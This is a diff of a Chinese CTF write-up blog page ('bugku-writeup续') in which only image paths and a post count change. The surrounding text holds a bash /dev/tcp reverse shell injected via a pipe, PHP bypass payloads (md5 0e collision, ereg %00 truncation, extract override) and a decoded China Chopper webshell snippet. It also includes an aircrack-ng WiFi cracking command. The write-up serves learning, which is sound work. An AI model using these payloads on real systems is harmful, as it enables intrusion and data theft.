@@ -104,14 +104,14 @@
 <meta property="og:site_name" content="Charles&#39; Blog">
 <meta property="og:description" content="杂项账号被盗了">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/1.png">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/2.png">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/3.png">
+<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/bugku-writeup续/1.png">
+<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/bugku-writeup续/2.png">
+<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/bugku-writeup续/3.png">
 <meta property="og:updated_time" content="2019-01-30T11:44:01.070Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku-writeup续">
 <meta name="twitter:description" content="杂项账号被盗了">
-<meta name="twitter:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/1.png">
+<meta name="twitter:image" content="http://chaosec.top/2018/04/03/bugku-writeup续/bugku-writeup续/1.png">
 
 
 
@@ -573,7 +573,7 @@
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的ip地址/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>如此即可成功反弹到shell!!!!(233333)</p>
 <p>然后读文件即可</p>
-<p><img src="/2018/04/03/bugku-writeup续/1.png" alt=""></p>
+<p><img src="bugku-writeup续/1.png" alt=""></p>
 <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>payload<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=240610708</span><br></pre></td></tr></table></figure></p>
 <h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p>
 <h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>比较简单，payload<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shiyan=<span class="built_in">flag</span>&amp;<span class="built_in">flag</span>=php:<span class="comment">//input</span></span><br><span class="line"><span class="built_in">flag</span></span><br></pre></td></tr></table></figure></p>
@@ -591,13 +591,13 @@
 <h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>直接解压，然后有个flag文件，hex里面找一下key即可。</p>
 <h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">	@set_magic_quotes_runtime0);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F=<span class="string">'C:\\wwwroot\\3.php'</span>;</span><br><span class="line">$P=@fopen($F,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;<span class="keyword">echo</span>(<span class="string">"X@Y"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p>
 <p>这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流</p>
-<p><img src="/2018/04/03/bugku-writeup续/2.png" alt=""></p>
+<p><img src="bugku-writeup续/2.png" alt=""></p>
 <p>这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag</p>
 <h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p>
 <h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>改变图片高度即可</p>
 <h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">aircrack-ng</span> <span class="selector-tag">wifi</span><span class="selector-class">.cap</span> <span class="selector-tag">-w</span> <span class="selector-tag">passwd</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2018/04/03/bugku-writeup续/3.png" alt=""></p>
+<p><img src="bugku-writeup续/3.png" alt=""></p>
 <h2 id="linux2"><a href="#linux2" class="headerlink" title="linux2"></a>linux2</h2><p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p>
 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">strings </span><span class="keyword">brave </span>&gt; a.txt</span><br></pre></td></tr></table></figure>
 <p>然后在a.txt中搜索一下 <code>key</code>，直接出现了flag</p>
@@ -816,7 +816,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-count">32</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
